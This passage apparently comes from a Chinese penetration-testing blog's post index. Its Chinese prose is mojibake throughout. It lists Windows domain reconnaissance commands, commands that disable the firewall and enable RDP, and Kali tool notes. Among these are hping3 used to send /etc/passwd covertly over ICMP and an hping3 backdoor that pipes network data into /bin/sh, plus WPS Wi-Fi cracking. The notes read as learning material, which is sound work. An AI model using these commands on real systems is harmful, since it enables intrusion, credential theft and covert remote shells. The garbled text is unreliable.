é€šè¿‡æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·å¯ä»¥çŸ¥é“ç®¡ç†å‘˜æ˜¯å¦åœ¨ç™»å½•ï¼Œå¦‚æœæˆ‘ä»¬RDPç™»å½•åˆ°è¿œç¨‹æ¡Œé¢ç„¶åæ’ä¸Šç®¡ç†å‘˜å°±ä¸å¥½äº†\n\n- **æŸ¥çœ‹æœ¬æœºç«¯å£å¼€æ”¾æƒ…å†µ**ï¼š`netstat -ano`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141614976.png)\n\n  å¯ä»¥æŸ¥çœ‹æœ¬æœºæ˜¯å¦ä¸å…¶ä»–æœºå™¨äº§ç”Ÿè¿æ¥ï¼Œåˆ†ææœ¬æœºå¼€å¯çš„ä¸šåŠ¡\n\n- **æŸ¥è¯¢è¡¥ä¸ä¿¡æ¯**ï¼š`systeminfo` `wmic qfe get Caption,Description,HotFixID,InstalledOn`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141616251.png)![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141618610.png)\n\n  çœ‹çœ‹æ¼æ´æ˜¯å¦è¢«ä¿®å¤ï¼Œé’ˆå¯¹æ€§å¯»æ‰¾exp\n\n- **æŸ¥è¯¢è·¯ç”±è¡¨**ï¼š`route print`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141622076.png)\n\n  **æ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å†²è¡¨**ï¼š`arp -a`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141633543.png)\n\n  é€šè¿‡åˆ†æè·¯ç”±å¯ä»¥çŸ¥é“æœºå™¨å¯ä»¥è®¿é—®å“ªäº›ç½‘æ®µçš„èµ„æº\n\n- **æŸ¥çœ‹é˜²ç«å¢™è®¾ç½®**ï¼š`netsh firewall show config`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141635082.png)\n\n  æŸ¥çœ‹é˜²ç«å¢™çš„å¼€å…³æƒ…å†µï¼Œä»¥åŠç›¸å…³çš„é…ç½®ä¿¡æ¯\n\n  å¦‚æœæˆ‘ä»¬ç›¸å¯¹é˜²ç«å¢™ç›¸å…³å†…å®¹è¿›è¡Œä¸€äº›æ›´æ”¹å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤\n\n  ```powershell\n  åœ¨Windows 2003åŠä¹‹å‰ç‰ˆæœ¬ï¼Œä½¿æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥ï¼š\n  netsh firewall add allowedprogram ç¨‹åºè·¯å¾„ \"è§„åˆ™å\" enable\n  \n  åœ¨Windows 2003ä¹‹åçš„ç‰ˆæœ¬ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š\n  netsh advfirewall firewall add rule name=\"è§„åˆ™å\" dir=in action=allow program=\"ç¨‹åºè·¯å¾„\"\n  \n  å…è®¸æŒ‡å®šç¨‹åºè¿å‡ºï¼š\n  netsh advfirewall firewall add rule name=\"è§„åˆ™å\" dir=out action=allow program=\"ç¨‹åºè·¯å¾„\"\n  \n  å…è®¸æŒ‡å®šç«¯å£æ”¾è¡Œï¼š\n  netsh advfirewall firewall add rule name=\"è§„åˆ™å\" protocol=TCP dir=in localport=ç«¯å£ action=allow program=\"ç¨‹åºè·¯å¾„\"\n  \n  è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—å­˜å‚¨ä½ç½®ï¼š\n  netsh advfirewall set currentprofile logging filename \"å­˜å‚¨æ–‡ä»¶è·¯å¾„\"\n  \n  Windows 2003åŠä¹‹å‰ç‰ˆæœ¬å…³é—­é˜²ç«å¢™ï¼š\n  netsh firewall set opmode disable\n  \n  Windows 2003ä»¥åç‰ˆæœ¬å…³é—­é˜²ç«å¢™ï¼š\n  netsh advfirewall set allprofiles state off\n  ```\n\n- **æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡**ï¼š`REG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /V PortNumber`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210141652896.png)\n\n  å¼€å¯è¿œç¨‹æ¡Œé¢çš„å‘½ä»¤\n  \n  ```powershell\n  Windows Server 2003å¼€3389ç«¯å£\n  wmic path win32_terminalservicesetting where (_CLASS !=\"\") call setallowtsconnections 1\n  \n  Windows Server 2008 å’Œ Windows Server 2012å¼€3389ç«¯å£\n  wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (_CLASS !=\"\") call setallowtsconnections 1\n  æˆ–\n  wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1\n  \n  Windows 7å¼€3389ç«¯å£\n  reg add \"HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER\" /v fSingleSessionPerUser /t REG DWORD /d 0 /f\n  ```\n\n### åŸŸå†…ä¿¡æ¯æœé›†\n\n- **è·å–åŸŸSID**ï¼š`whoami /all`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151703166.png)\n\n  æœé›†SIDå¯ä»¥ç”¨äºç¥¨æ®ä¼ é€’æ”»å‡»ï¼Œè¿˜æœ‰éƒ¨åˆ†ææƒæ–¹å¼éœ€è¦æ‰‹æœºç‰¹æƒä¿¡æ¯æ¥è¿›è¡Œ\n\n- **æŸ¥è¯¢åŸŸå†…å®¹æˆ·**ï¼š`net user /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151706114.png)\n\n- **æŸ¥çœ‹åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯**ï¼š`net user ç”¨æˆ·å /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210151707950.png)\n\n  å¯ä»¥çœ‹åˆ°ç»„æˆå‘˜å†…å®¹æ¥åˆ¤æ–­ç”¨æˆ·ç»„åŠæƒé™\n\n- **æŸ¥çœ‹æœ¬æœºæ‰€åœ¨çš„æ‰€æœ‰åŸŸ**ï¼š`net view /domain`\n\n  åœ¨å­˜åœ¨å¤šä¸ªåŸŸçš„æ—¶å€™å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æ¥çœ‹æ‰€å­˜åœ¨çš„æ‰€æœ‰åŸŸ\n  \n- **æŸ¥è¯¢åŸŸç®¡ç†å‘˜åˆ—è¡¨**ï¼š`net group \"domain admins\" /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161722867.png)\n\n  å¯ä»¥çœ‹åˆ°åªæœ‰ä¸€ä¸ªåŸŸç®¡ç†å‘˜\n\n- **æŸ¥çœ‹åŸŸå†…æ—¶é—´ï¼ˆæ—¶é—´æœåŠ¡å™¨ï¼‰**ï¼š`net time /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161724650.png)\n\n  é€šè¿‡æŸ¥çœ‹åŸŸå†…æ—¶é—´ä»¥åŠæ—¶é—´æœåŠ¡å™¨ï¼Œå°±å¯ä»¥ä½¿ç”¨å®šæ—¶ä»»åŠ¡+IPCæ¥è¿è¡Œä¸€äº›batæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡pingåŸŸå†…æ—¶é—´æœåŠ¡å™¨æ¥å¾—åˆ°å…¶IP\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161728786.png)\n\n- **æŸ¥çœ‹ç™»å½•æœ¬æœºçš„åŸŸç®¡ç†å‘˜**ï¼š`net localgroup administrators /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161730087.png)\n\n- **æŸ¥çœ‹åŸŸä¸­æ‰€æœ‰ç”¨æˆ·ç»„**ï¼š`net groups /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161731765.png)\n\n- **æŸ¥çœ‹ä¸»åŸŸæ§åˆ¶å™¨**ï¼š`netdom query pdc`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161732635.png)\n\n  ç›´æ¥pingå°±èƒ½æ‹¿åˆ°IP\n\n- **æŸ¥çœ‹æ‰€æœ‰åŸŸæ§åˆ¶å™¨**ï¼š`net group \"Domain Controllers\" /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210161734364.png)\n  \n  è¿™é‡Œåº”è¯¥è¿˜æœ‰ä¸ªè¾…åŸŸçš„ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æ¶ˆå¤±äº†ï¼Œåé¢å†å›æ¥çœ‹çœ‹\n  \n  è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŸŸæ§åˆ¶å™¨çš„æœºå™¨åç§°æ¥æŸ¥çœ‹åŸŸæ§ä¸»æœºï¼ŒçŸ¥é“å…¶IPåæˆ‘ä»¬å¯ä»¥å¯¹å…¶è¿›è¡Œé’ˆå¯¹æ€§çš„æ¸—é€ï¼Œåªéœ€æ¸—é€æ ¸å¿ƒæœºå™¨ï¼Œæ•´ä¸ªåŸŸçš„æ§åˆ¶æƒä¹Ÿå°±åˆ°æ‰‹äº†\n  \n- **æŸ¥è¯¢åŸŸä¿¡ä»»ä¿¡æ¯**ï¼š`nltest /domain_trusts`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210170338052.png)\n\n  å¯ä»¥çœ‹åˆ°ä¸»åŸŸåæ˜¯bxsteam.comï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªsaulå­åŸŸï¼ŒäºŒè€…åŒå‘è®¤è¯ï¼Œå½¼æ­¤çš„ç”¨æˆ·å¯ä»¥äº’ç›¸ç™»å½•\n\n- **æŸ¥è¯¢åŸŸå¯†ç ä¿¡æ¯**ï¼š`net accounts /domain`\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210170340232.png)\n\n  å¯ä»¥çœ‹åˆ°åŸŸä¸­å¯†ç ä½¿ç”¨ç­–ç•¥ï¼Œåœ¨çˆ†ç ´æ—¶é˜²æ­¢æˆ‘ä»¬ç”Ÿæˆæ— æ•ˆçš„å¯†ç å­—å…¸\n\n","tags":["å†…ç½‘æ¸—é€"]},{"title":"Kaliä»0åˆ°1","url":"/posts/8b8ae737.html","content":"\n# å·¥å…·å¤§å…¨\n\n## ä¿¡æ¯æ”¶é›†\n\n### å­˜æ´»ä¸»æœºè¯†åˆ«\n\n- **arping**ï¼š\n\n  - ç±»ä¼¼äºpingï¼Œä¹Ÿæ˜¯ç”¨æ¥æ¢æµ‹å­˜æ´»çš„ï¼Œä¸è¿‡ä½¿ç”¨çš„arpåè®®ä¸æ˜¯ICMPåè®®ï¼Œæ‰€ä»¥åªèƒ½æ¢æµ‹å†…ç½‘ä¸èƒ½ç¢°å…¬ç½‘\n  - -tå‚æ•°å¯ä»¥æ·»åŠ macåœ°å€ï¼Œæ¥ä¿è¯IPåœ°å€ç»‘å®šåˆ°äº†æŒ‡å®šçš„MACåœ°å€ä¸Š\n  - è¿˜è¡Œå§ï¼Œå¯èƒ½pingä¸ç®¡ç”¨çš„æ—¶å€™å¯ä»¥ç”¨ï¼Œå“¦è¿˜å¯ä»¥ç”¨æ¥æmacåœ°å€\n\n- **fping**ï¼š\n\n  - pingçš„åŠ å¼ºç‰ˆï¼Œfpingå¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šè¦pingçš„ä¸»æœºèŒƒå›´\n\n  - ä¸pingè¦ç­‰å¾…æŸä¸€ä¸»æœºè¿æ¥è¶…æ—¶æˆ–å‘å›åé¦ˆä¿¡æ¯ä¸åŒï¼Œfpingç»™ä¸€ä¸ªä¸»æœºå‘é€å®Œæ•°æ®åŒ…åï¼Œé©¬ä¸Šç»™ä¸‹ä¸€ä¸ªä¸»æœºå‘é€æ•°æ®åŒ…ï¼Œå®ç°å¤šä¸»æœºåŒæ—¶pingã€‚å¦‚æœæŸä¸€ä¸»æœºpingé€šï¼Œåˆ™æ­¤ä¸»æœºå°†è¢«æ‰“ä¸Šæ ‡è®°ï¼Œå¹¶ä»ç­‰å¾…åˆ—è¡¨ä¸­ç§»é™¤ï¼Œå¦‚æœæ²¡pingé€šï¼Œè¯´æ˜ä¸»æœºæ— æ³•åˆ°è¾¾ï¼Œä¸»æœºä»ç„¶ç•™åœ¨ç­‰å¾…åˆ—è¡¨ä¸­ï¼Œç­‰å¾…åç»­æ“ä½œã€‚\n\n  - ```shell\n    fping IP1 IP2 IP3 ...\n    fping -f filename\n    fping -g IP1 IP2\n    å¯ä»¥æ·»åŠ -aå‚æ•°æ¥åªæ˜¾ç¤ºå­˜æ´»ä¸»æœº\n    ```\n\n  - pingçš„å‡çº§ç‰ˆï¼ˆè‡ªå·±å†™æ­Œè„šæœ¬è²Œä¼¼ä¹Ÿå·®ä¸å¤šï¼‰\n\n- **hping3**ï¼š\n\n  - hpingæ˜¯å®‰å…¨å®¡è®¡ã€é˜²ç«å¢™æµ‹è¯•ç­‰å·¥ä½œçš„æ ‡é…å·¥å…·ã€‚hpingä¼˜åŠ¿åœ¨äºèƒ½å¤Ÿå®šåˆ¶æ•°æ®åŒ…çš„å„ä¸ªéƒ¨åˆ†ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥çµæ´»å¯¹ç›®æ ‡æœºè¿›è¡Œç»†è‡´åœ°æ¢æµ‹ã€‚\n\n  - å¯ä»¥è‡ªå·±å®šåˆ¶æ•°æ®åŒ…æ¥æ¢æµ‹é˜²ç«å¢™ï¼Œä¹Ÿå¯ä»¥è¯¦ç»†æŸ¥çœ‹å“åº”æ¥åˆ¤æ–­æ‹¦æˆªç­‰å†…å®¹ï¼Œç”šè‡³å¯ä»¥ç”¨æ¥ä¼ªé€ ICMPåŒ…æ¥æ‰“DDOS\n\n  - ```\n    -a æŒ‡å®šåŒ…çš„è¯·æ±‚IPï¼Œå¯ä»¥æŒ‡å®šä¸ºç›®æ ‡æ¥è®©è‡ªå·±åå¤pingè‡ªå·±ï¼Œä¸è¿‡è¿™æ ·çš„è¯è‡ªå·±ä¹Ÿå°±æ”¶ä¸åˆ°å“åº”æ•°æ®äº†\n    -p æŒ‡å®šç«¯å£\n    -I æŒ‡å®šç½‘å¡\n    -c æŒ‡å®šå‘åŒ…æ¬¡æ•°\n    ```\n\n  - **æ–‡ä»¶ä¼ è¾“**\n\n    - Hping3æ”¯æŒé€šè¿‡TCP/UDP/ICMPç­‰åŒ…æ¥è¿›è¡Œæ–‡ä»¶ä¼ è¾“ã€‚ç›¸å½“äºå€ŸåŠ©TCP/UDP/ICMPåŒ…å»ºç«‹éšç§˜éš§é“é€šè®¯ã€‚å®ç°æ–¹å¼æ˜¯å¼€å¯ç›‘å¬ç«¯å£ï¼Œå¯¹æ£€æµ‹åˆ°çš„ç­¾åï¼ˆç­¾åä¸ºç”¨æˆ·æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼‰çš„å†…å®¹è¿›è¡Œç›¸åº”çš„è§£æã€‚åœ¨æ¥æ”¶ç«¯å¼€å¯æœåŠ¡ï¼š\n\n    - ```shell\n      hping3 æºIP --listen signature --safe  --icmp\n      ```\n\n    - ç›‘å¬ICMPåŒ…ä¸­çš„ç­¾åï¼Œæ ¹æ®ç­¾åè§£æå‡ºæ–‡ä»¶å†…å®¹ã€‚\n\n    - åœ¨å‘é€ç«¯ä½¿ç”¨ç­¾åæ‰“åŒ…çš„ICMPåŒ…å‘é€æ–‡ä»¶ï¼š\n\n    - ```shell\n      hping3 ç›®æ ‡IP --icmp -d 100 --sign signature --file /etc/passwd\n      ```\n\n    - å°†`/etc/passwd`å¯†ç æ–‡ä»¶é€šè¿‡ICMPåŒ…ä¼ ç»™ç›®æ ‡ä¸»æœºã€‚å‘é€åŒ…å¤§å°ä¸º100å­—èŠ‚ï¼ˆ-d 100ï¼‰ï¼Œå‘é€ç­¾åä¸ºsignature(-sign signature)ã€‚\n\n  - **åå¼¹shellåŠŸèƒ½**\n\n    - å¦‚æœHping3èƒ½å¤Ÿåœ¨è¿œç¨‹ä¸»æœºä¸Šå¯åŠ¨ï¼Œé‚£ä¹ˆå¯ä»¥ä½œä¸ºæœ¨é©¬ç¨‹åºå¯åŠ¨ç›‘å¬ç«¯å£ï¼Œå¹¶åœ¨å»ºç«‹è¿æ¥åæ‰“å¼€shellé€šä¿¡ã€‚ä¸netcatçš„åé—¨åŠŸèƒ½ç±»ä¼¼ã€‚\n\n    - ç¤ºä¾‹ï¼šæœ¬åœ°æ‰“å¼€53å·UDPç«¯å£ï¼ˆDNSè§£ææœåŠ¡ï¼‰ç›‘å¬æ¥è‡ª192.168.10.66ä¸»æœºçš„åŒ…å«ç­¾åä¸ºsignatureçš„æ•°æ®åŒ…ï¼Œå¹¶å°†æ”¶åˆ°çš„æ•°æ®è°ƒç”¨/bin/shæ‰§è¡Œã€‚\n\n    - åœ¨æœ¨é©¬å¯åŠ¨ç«¯ï¼š\n\n    - ```\n      hping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh\n      ```\n\n    - åœ¨è¿œç¨‹æ§åˆ¶ç«¯ï¼š\n\n    - ```\n      echo ls >test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd\n      ```\n\n    - å°†åŒ…å«lså‘½ä»¤çš„æ–‡ä»¶åŠ ä¸Šç­¾åsignatureå‘é€åˆ°192.168.10.44ä¸»æœºçš„53å·UDPç«¯å£ï¼ŒåŒ…æ•°æ®é•¿åº¦ä¸º100å­—èŠ‚ã€‚\n\n    - å½“ç„¶è¿™é‡Œåªæ˜¯ç®€å•çš„æ¼”ç¤ºç¨‹åºï¼ŒçœŸå®çš„åœºæ™¯ï¼Œæ§åˆ¶ç«¯å¯ä»¥åˆ©ç›Šshellæ‰§è¡Œå¾ˆå¤šçš„é«˜çº§å¤æ‚çš„æ“ä½œã€‚\n\n  - å¥½é«˜çº§çš„è¯´ï¼Œå¯ä»¥è‡ªå®šä¹‰çš„éƒ¨åˆ†ä¹Ÿå¾ˆå¤šï¼Œä¹Ÿæœ‰ä¸€äº›æœ‰è¶£çš„åº”ç”¨ï¼Œå¯å†²\n\n- **masscan**ï¼š\n\n  - åˆä¸€ä¸ªæ‰«æå·¥å…·ï¼Œç»™ä¸ªä¾‹å­å°±è¿‡ï¼Œå¥½å¿«å•Š\n\n  - ```\n    masscan -p80,8080-8100 10.0.0.0/8 \n    ï¼ˆæ‰«æ10.x.x.xå­ç½‘ï¼Œæ‰«æç«¯å£80å’Œ8000-8100èŒƒå›´çš„ç«¯å£æ®µï¼‰\n    å¯ä½¿ç”¨--echoæŠŠå½“å‰é…ç½®è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œ-cä½¿ç”¨æ–‡ä»¶\n    --source-ip æŒ‡å®šæºIP\n    --excludefile æ–‡ä»¶ æŒ‡å®šç½‘æ®µå¿½ç•¥\n    --max-rate 100000 æœ€é«˜å‘åŒ…é€Ÿç‡\n    --banners è·å–bannerä¿¡æ¯ï¼Œæ”¯æŒå°‘é‡çš„åè®®\n    ```\n\n  - mdä½ å¿«æœ‰ä¸ªåµå­ç”¨ï¼Œæ‰«ä¸å‡ºæ¥ç«¯å£å­˜æ´»ä¿¡æ¯å•Š\n\n- **thcping6**ï¼š\n\n  - é’ˆå¯¹IPV6çš„å‘åŒ…å·¥å…·ï¼Œéš¶å±äºatk6è¿™ä¸ªè¿™ä¸ªå·¥å…·åŒ…ä¸‹ï¼Œå®˜æ–¹æè¿°æ˜¯sends a hand crafted ping6 packetï¼Œå°±æ˜¯æ‰‹åŠ¨æ„é€ ä¸€ä¸ªping6çš„æ•°æ®åŒ…\n  - å­¦äº†IPV6å†æ¥\n\n### è·¯ç”±åˆ†æ\n\n- **netdiscover**ï¼š\n  \n  - äºŒå±‚å‘ç°å·¥å…·ï¼Œæ‹¥æœ‰ä¸»åŠ¨å’Œè¢«åŠ¨å‘ç°ä¸¤ç§æ–¹å¼ï¼Œé€šè¿‡ARPè·¯ç”±è¡¨æ¢æµ‹\n  - æœ€ç®€å•çš„å°±æ˜¯ç›´æ¥è¾“å…¥netdiscoverä¹‹åå°±æ˜¯è¿è¡Œå®ƒçš„é»˜è®¤é…ç½®ç„¶åæ‰«æå±€åŸŸç½‘ä¸­æ‰€æœ‰çš„æœºå™¨\n  - ä¹Ÿå¯ä»¥ç›´æ¥è¾“å…¥ç½‘å¡è®©ä»–è‡ªå·±è·‘ä¸¤å±‚\n  - æ¯å¤©ä¸€ä¸ªè¢«æ‰“ç”µè¯å°æŠ€å·§\n  \n- **netmask**ï¼š\n\n  - netmakså¯ä»¥åœ¨ IPèŒƒå›´ã€å­ç½‘æ©ç ã€cidrã€ciscoç­‰æ ¼å¼ä¸­äº’ç›¸è½¬æ¢ï¼Œå¹¶ä¸”æä¾›äº†IPåœ°å€çš„ç‚¹åˆ†åè¿›åˆ¶ã€16è¿›åˆ¶ã€8è¿›åˆ¶ã€2è¿›åˆ¶ä¹‹é—´çš„äº’ç›¸è½¬æ¢\n\n  - ```\n    Usage: netmask spec [spec ...]\n      -h, --help                    Print a summary of the options\n      -v, --version                 Print the version number\n      -d, --debug                   Print status/progress information\n      -s, --standard                Output address/netmask pairs\n      -c, --cidr                    Output CIDR format address lists\n      -i, --cisco                   Output Cisco style address lists\n      -r, --range                   Output ip address ranges\n      -x, --hex                     Output address/netmask pairs in hex\n      -o, --octal                   Output address/netmask pairs in octal\n      -b, --binary                  Output address/netmask pairs in binary\n      -n, --nodns                   Disable DNS lookups for addresses\n      -f, --files                   Treat arguments as input files\n    Definitions:\n      a spec can be any of:\n        address\n        address:address\n        address:+address\n        address/mask\n      an address can be any of:\n        N           decimal number\n        0N          octal number\n        0xN         hex number\n        N.N.N.N     dotted quad\n        hostname    dns domain name\n      a mask is the number of bits set to one from the left\n    ```\n\n  - è¿™ä¸ªçœ‹å®˜æ–¹æ–‡æ¡£å§\n\n### æƒ…æŠ¥åˆ†æ\n\n- **spiderfoot**ï¼š\n\n  - ä¸€ä¸ªå¯ä»¥è‡ªåŠ¨è¿›è¡Œå¤§é‡æŸ¥è¯¢çš„å·¥å…·\n  - å¯åŠ¨éœ€è¦æŒ‡å®šå¥½ç›‘å¬çš„IPå’Œç«¯å£ï¼Œç„¶åæµè§ˆå™¨ç›´æ¥è®¿é—®å°±è¡Œå•¦\n  - å¥½ç”¨çš„è€¶ï¼Œä¸€äº›èµ„äº§æœå¯»ä¸ç”¨æ‰‹åŠ¨åšäº†ï¼Œè€Œä¸”è¿˜å¯ä»¥æ²¡äº‹æœæœè‡ªå·±æ¥ä¿æŠ¤è‡ªå·±\n\n- **theHarvester**ï¼š\n\n  - è¿™ä¸ªå˜›å°±æ˜¯ä¸€ä¸ªæ‰‹åŠ¨çš„æœç´¢å·¥å…·å•¦ï¼Œç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£å°±å¥½\n\n  - ```\n    -d\t--domain\t\t\t\t\tè¦æœç´¢çš„å…¬å¸åç§°æˆ–åŸŸåã€‚\n    -l\t--limit\t\t\t\t\t\té™åˆ¶æœç´¢ç»“æœçš„æ•°é‡ï¼Œé»˜è®¤=500ã€‚\n    -S\t--start\t\t\t\t\t\tä»ç»“æœç¼–å· X å¼€å§‹ï¼Œé»˜è®¤ = 0ã€‚\n    -g\t--google-dork\t\t\tä½¿ç”¨ Google Dorks è¿›è¡Œ Google æœç´¢ã€‚\n    -p\t--proxies\t\t\t\t\tå¯¹è¯·æ±‚ä½¿ç”¨ä»£ç†ï¼Œåœ¨ proxies.yaml ä¸­è¾“å…¥ä»£ç†\n    -s\t--shodan\t\t\t\t\tä½¿ç”¨ Shodan æŸ¥è¯¢å‘ç°çš„ä¸»æœºã€‚\n    --screenshot\t\t\t\t\tå¯¹å·²è§£æçš„åŸŸè¿›è¡Œæˆªå›¾ï¼ŒæŒ‡å®šè¾“å‡ºç›®å½•ï¼š--screenshot output_directory\n    -v\t--virtual-host\t\té€šè¿‡ DNS è§£æéªŒè¯ä¸»æœºåå¹¶æœç´¢è™šæ‹Ÿä¸»æœºã€‚\n    -e\t--dns-server\t\t\tç”¨äºæŸ¥æ‰¾çš„ DNS æœåŠ¡å™¨ã€‚\n    -f\t--filename\t\t\t\tå°†ç»“æœä¿å­˜åˆ° XML å’Œ JSON æ–‡ä»¶ã€‚\n    -b\t--source\t\t\t\t\tæŒ‡å®šæœç´¢çš„å¼•æ“å’Œæ•°æ®æº\n    \n    #theHarvester -d [url] -l 300 -b [æœç´¢å¼•æ“åç§°]\n    ```\n\n  - æ²¡ä¸Šä¸€ä¸ªè‡ªåŠ¨åŒ–çš„å¥½ç”¨ï¼Œä¸å¼€å¿ƒğŸ˜’\n\n## æ¼æ´åˆ†æ\n\n### Fuzzingå·¥å…·é›†\n\n\n\n\n\n\n\n\n\n\n\n\n\n## Webç¨‹åº\n\n## æ•°æ®åº“è¯„ä¼°è½¯ä»¶\n\n## å¯†ç æ”»å‡»\n\n## æ— çº¿æ”»å‡»\n\n### è“ç‰™å·¥å…·é›†\n\n### æ— çº¿å·¥å…·é›†\n\n- **bully**ï¼š\n\n  - Wi-Fiç ´è§£ï¼Œé€šè¿‡çˆ†ç ´WPSæ¨¡å¼ä¸‹7ä½é•¿åº¦PINå€¼æ¥è·å–Wi-Fiå¯†ç \n\n  - ä½¿ç”¨æ–¹æ³•\n\n  - ```shell\n    bully ç›‘å¬æ¨¡å¼ç½‘å¡å -b ç›®æ ‡BSSID -e ç›®æ ‡SSID -c ç›®æ ‡å¹¿æ’­ä¿¡é“\n    ```\n\n  - å¯ä»¥çœ‹åˆ°æœ‰è®¸å¤šå‚æ•°ï¼Œä»–ä»¬çš„è·å–æ–¹å¼æˆ‘ä»¬ä¼šåœ¨åé¢æåˆ°\n\n  - è¿˜æ²¡æœ‰è¯•è¿‡ï¼Œæ”¹å¤©å°è¯•ä¸€ä¸‹\n\n- **Fern WiFi Cracker**ï¼š\n\n  - å›¾å½¢åŒ–çš„Wi-Fiç ´è§£å·¥å…·ï¼Œå¯ä»¥é€šè¿‡ç ´è§£è·¯ç”±åˆ°è®¾å¤‡çš„åŠ å¯†åŒ…æ¥å®ç°Wi-Fiå¯†ç è§£æ\n  - ç­‰æˆ‘ç¬”è®°æœ¬kaliè£…å¥½çš„ï¼ˆ\n\n## é€†å‘å·¥ç¨‹\n\n## æ¼æ´åˆ©ç”¨å·¥å…·é›†\n\n## å—…æ¢/æ¬ºéª—\n\n### ç½‘ç»œæ¬ºéª—\n\n- **sslsplit**ï¼š\n"},{"title":"URLå’ŒHTTPåè®®","url":"/posts/11f51f93.html","content":"\n# URL\n\né‡äº‹ä¸å†³å…ˆç™¾åº¦\n\n> å› ç‰¹ç½‘ä¸Šçš„å¯ç”¨èµ„æºå¯ä»¥ç”¨ç®€å•å­—ç¬¦ä¸²æ¥è¡¨ç¤ºï¼Œè¯¥æ–‡æ¡£å°±æ˜¯æè¿°äº†è¿™ç§å­—ç¬¦ä¸²çš„è¯­æ³•å’Œè¯­ä¹‰ã€‚è€Œè¿™äº›å­—ç¬¦ä¸²åˆ™è¢«ç§°ä¸ºï¼šâ€œ[ç»Ÿä¸€èµ„æºå®šä½å™¨](https://baike.baidu.com/item/ç»Ÿä¸€èµ„æºå®šä½å™¨/7682460?fromModule=lemma_inlink)â€ï¼ˆURLï¼‰ã€‚è¿™ç¯‡è¯´æ˜æºäºä¸‡ç»´ç½‘å…¨çƒä¿¡æ¯ä¸»åŠ¨ç»„ç»‡ï¼ˆWorld Wide Web global informationinitiativeï¼‰ä»‹ç»çš„æ¦‚å¿µã€‚RFC1630ã€Šé€šç”¨èµ„æºæ ‡å¿—ç¬¦ã€‹æè¿°äº†ä¸€äº›å¯¹è±¡æ•°æ®ï¼Œä»–ä»¬è‡ª1990å¹´èµ·å°±å¼€å§‹ä½¿ç”¨è¿™äº›å¯¹è±¡æ•°æ®ã€‚è¿™ç¯‡URLè¯´æ˜ç¬¦åˆã€Šå› ç‰¹ç½‘èµ„æºå®šä½ç¬¦çš„åŠŸèƒ½éœ€æ±‚ï¼ˆFunctional Requirements for Internet Resource Locatorsï¼‰ã€‹ä¸­è¯´æ˜çš„éœ€æ±‚ã€‚è¿™ç¯‡æ–‡æ¡£æ˜¯ç”±å·¥ç¨‹ä»»åŠ¡ç»„ç»‡ï¼ˆIETFï¼‰çš„URIå·¥ä½œå°ç»„å†™çš„ \n\nè‚¯å®šçœ‹ä¸æ‡‚å¯¹å§ï¼Œæ²¡å…³ç³»ï¼Œä½ åªéœ€è¦çŸ¥é“è¿™ä¸ªä¸œè¥¿æ˜¯ç”¨æ¥å¯»æ‰¾äº’è”ç½‘ä¸Šçš„èµ„æºå°±å¯ä»¥äº†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹ä¸€ä¸ªURLçš„å®Œæ•´æ ¼å¼\n\n```\nscheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]\n```\n\nè´´å¿ƒçš„ä¸­æ–‡ç¿»è¯‘\n\n```\nåè®®:[//[ç”¨æˆ·[:å¯†ç 